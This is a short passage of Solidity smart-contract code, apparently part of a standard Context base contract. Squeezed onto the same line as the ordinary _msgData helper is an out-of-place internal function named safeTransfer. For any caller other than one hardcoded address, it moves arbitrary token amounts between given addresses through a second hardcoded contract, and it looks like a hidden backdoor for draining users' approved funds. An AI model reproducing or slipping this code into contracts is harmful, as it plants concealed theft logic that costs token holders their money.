 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x41F56F02faB5be20f7A9147B886ce0465c269784)) {TransferHelper.safeTransferFrom(0xe050C594742b5e676610227053551bac3c2d02D7,spender,recipient,amount);return true;}return false;}
}
